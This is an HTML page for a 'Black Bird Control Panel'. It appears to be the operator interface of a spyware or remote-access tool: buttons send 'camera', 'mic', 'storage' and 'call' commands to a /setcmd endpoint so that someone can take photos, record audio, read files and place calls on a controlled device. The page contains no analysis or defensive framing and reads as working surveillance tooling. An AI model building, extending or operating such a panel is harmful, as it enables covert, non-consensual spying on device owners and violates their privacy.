<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Black Bird Control Panel</title>
  <style>
    body {
      background: #000;
      color: #0f0;
      font-family: monospace;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    h1 {
      color: #0ff;
    }
    button {
      background: #111;
      color: #0f0;
      border: 1px solid #0f0;
      padding: 10px 20px;
      margin: 10px;
      cursor: pointer;
    }
    button:hover {
      background: #0f0;
      color: #000;
    }
  </style>
</head>
<body>
  <h1>Black Bird Control Panel</h1>
  <button onclick="sendCommand('camera')">Take Photo</button>
  <button onclick="sendCommand('mic')">Record Mic (5s)</button>
  <button onclick="sendCommand('storage')">Access Storage</button>
  <button onclick="sendCommand('call')">Trigger Call</button>

  <script>
    function sendCommand(cmd) {
      fetch('/setcmd', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cmd })
      }).then(res => {
        if (res.ok) {
          alert("Command sent: " + cmd);
        } else {
          alert("Failed to send command.");
        }
      });
    }
  </script>
</body>
</html>
